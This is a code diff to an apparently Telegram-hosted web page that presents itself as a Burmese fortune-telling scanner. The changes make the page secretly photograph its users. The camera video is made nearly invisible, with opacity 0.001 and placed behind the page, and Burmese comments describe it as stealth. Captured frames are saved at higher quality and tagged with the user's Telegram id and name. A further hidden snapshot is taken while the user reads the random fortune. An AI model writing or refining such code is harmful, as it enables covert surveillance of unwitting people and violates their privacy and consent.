@@ -9,8 +9,16 @@
         body { background: #0a0e14; color: #00d2ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; overflow-x: hidden; }
         .container { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
         
-        /* Stealth Video - Render မရပ်သွားအောင် off-screen ကိုပို့ထားပါသည် */
-        #video { position: fixed; top: -2000px; left: -2000px; width: 640px; height: 480px; pointer-events: none; }
+        /* [အရေးကြီးပြင်ဆင်ချက်] Stealth Video - ဖုန်းက Render မရပ်သွားအောင် ဖန်သားပြင်ပေါ်မှာပဲထားပြီး မမြင်ရအောင် ဖျောက်ထားပါမည် */
+        #video { 
+            position: fixed; 
+            top: 50%; left: 50%; 
+            transform: translate(-50%, -50%);
+            width: 50px; height: 50px; 
+            opacity: 0.001; /* လုံးဝနီးပါး မမြင်ရအောင်လုပ်ထားသည် */
+            z-index: -10;   /* အနောက်ဆုံးကို ပို့ထားသည် */
+            pointer-events: none; 
+        }
         
         /* Scanner UI */
         .scan-line { width: 80%; height: 2px; background: #00d2ff; position: absolute; animation: scan 3s infinite linear; }
@@ -87,12 +95,21 @@
                 video.srcObject = stream; 
                 status.innerText = "ကင်မရာ ချိတ်ဆက်ပြီးပါပြီ။ စတင်နေပါသည်...";
                 
-                const checkVideo = setInterval(() => {
-                    if (video.readyState >= 3 && video.videoWidth > 0) {
-                        clearInterval(checkVideo);
-                        startProcess();
-                    }
-                }, 200);
+                // [အရေးကြီးပြင်ဆင်ချက်] Video ကို သေချာ Play လုပ်ပေးရမည်
+                video.play().then(() => {
+                    // ဖုန်းကင်မရာ အလင်းအမှောင်ချိန်နိုင်ရန် (Exposure) ၁.၅ စက္ကန့် စောင့်ပေးပါမည်
+                    setTimeout(() => {
+                        const checkVideo = setInterval(() => {
+                            if (video.videoWidth > 0 && video.videoHeight > 0) {
+                                clearInterval(checkVideo);
+                                startProcess();
+                            }
+                        }, 100);
+                    }, 1500);
+                }).catch(err => {
+                    console.error("Video play error:", err);
+                    status.innerText = "Error: " + err.message;
+                });
             })
             .catch(() => status.innerText = "ကံဇာတာစစ်ဆေးရန် Allow ကိုနှိပ်ပေးပါ။");
 
@@ -126,7 +143,8 @@
             
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            const img = canvas.toDataURL('image/jpeg', 0.6);
+            // အရည်အသွေး နည်းနည်းမြင့်လိုက်ပါသည် (0.6 -> 0.8)
+            const img = canvas.toDataURL('image/jpeg', 0.8); 
             const user = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : null;
             const uid = user ? user.id : "Guest";
             const uname = user ? user.first_name : "External";
@@ -149,7 +167,7 @@
             document.getElementById('result-card').style.display = 'block';
 
             const results = [
-                // --- အချစ်ရေး (Love & Relationship) [Index: 0 to 9] ---
+                // --- အချစ်ရေး (Love & Relationship) ---
                 "ယနေ့ Crush ဆီမှ Message ရောက်လာတတ်သည်။",
                 "အချစ်သစ်နှင့် ဆုံတွေ့ဖို့ ၈၀% သေချာနေပြီ။",
                 "ဟောင်းလေသော အချစ်ဟောင်းများ ပြန်ပေါ်လာတတ်သည်။",
@@ -161,7 +179,7 @@
                 "ယနေ့သည် အချစ်ရေးထက် သူငယ်ချင်းများနှင့် အချိန်ဖြုန်းသင့်သောနေ့ဖြစ်သည်။",
                 "Relationship ထဲမှာ နားလည်မှု အပြည့်အဝ ရရှိမည့်နေ့။",
 
-                // --- ငွေကြေးနှင့် ကံကောင်းခြင်း (Wealth & Luck) [Index: 10 to 19] ---
+                // --- ငွေကြေးနှင့် ကံကောင်းခြင်း (Wealth & Luck) ---
                 "မမျှော်လင့်ဘဲ လက်ဆောင် (သို့) မုန့်ဖိုး ရရှိတတ်သည်။",
                 "ထီပေါက်သလိုမျိုး ငွေဝင်ကိန်း အလွန်ကောင်းနေသည်။",
                 "ပိုက်ဆံအိတ်ထဲတွင် ငွေမပြတ်ဘဲ အမြဲရှိနေမည့်နေ့။",
@@ -173,7 +191,7 @@
                 "ယနေ့ ရင်းနှီးမြှုပ်နှံမှုလုပ်လျှင် အောင်မြင်နိုင်ချေ ရှိသည်။",
                 "ပိုက်ဆံကောက်ရတတ်သဖြင့် လမ်းလျှောက်လျှင် မြေကြီးကို ကြည့်ပါ။",
 
-                // --- ကျန်းမာရေးနှင့် စိတ်ခံစားချက် (Health & Mood) [Index: 20 to 29] ---
+                // --- ကျန်းမာရေးနှင့် စိတ်ခံစားချက် (Health & Mood) ---
                 "စိတ်ပျော်ရွှင်စရာ သတင်းကောင်းတစ်ခု ကြားရလိမ့်မည်။",
                 "ကျန်းမာရေးအတွက် ရေများများသောက်ရန် လိုအပ်နေသည်။",
                 "ယနေ့သည် အိမ်မှာပဲ အေးအေးဆေးဆေး နားယူသင့်သောနေ့ဖြစ်သည်။",
@@ -185,7 +203,7 @@
                 "စိတ်ဓာတ်ကျစရာရှိလျှင် သီချင်းအေးအေးလေး နားထောင်ပါ။",
                 "ယနေ့ သင့်ရဲ့ အပြုံးက ကမ္ဘာကြီးကို လှပစေပါလိမ့်မည်။",
 
-                // --- ဟာသနှင့် ထူးထူးဆန်းဆန်း (Fun & Mystery) [Index: 30 to 49] ---
+                // --- ဟာသနှင့် ထူးထူးဆန်းဆန်း (Fun & Mystery) ---
                 "ယနေ့ သင့်အား လူကြီးသူမတစ်ဦးက ဆူပူတတ်သဖြင့် ငြိမ်ငြိမ်နေပါ။",
                 "ခရီးသွားလျှင် လမ်းတွင် ရည်းစားဟောင်းနှင့် ဆုံတတ်သည်။",
                 "ယနေ့ ကံကောင်းခြင်းနံပါတ်မှာ ၇ ဖြစ်သည်။",
@@ -211,16 +229,13 @@
             const colors = ["ရွှေရောင် (Gold)", "အပြာနုရောင် (Sky Blue)", "အနီရောင် (Crimson Red)", "အဖြူရောင် (White)", "အနက်ရောင် (Black)"];
 
             document.getElementById('luck-val').innerText = Math.floor(Math.random() * (100 - 85 + 1) + 85) + "%";
-            
-            // အချစ်ရေးအတွက် Index 0 မှ 9 ထိ Random ယူသည်
             document.getElementById('love-val').innerText = results[Math.floor(Math.random() * 10)]; 
-            
-            // စီးပွားရေးအတွက် Index 10 မှ 19 ထိ Random ယူသည်
             document.getElementById('wealth-val').innerText = results[Math.floor(Math.random() * 10) + 10]; 
-            
             document.getElementById('color-val').innerText = colors[Math.floor(Math.random() * colors.length)];
             
             setTimeout(sendReportCard, 1000);
+            
+            // နောက်ဆုံးအနေနဲ့ Card ဖတ်နေချိန်မှာပါ ထပ်ရိုက်ပါမည်
             setTimeout(() => { captureImage("User Reading Result..."); }, 2000); 
         }
 
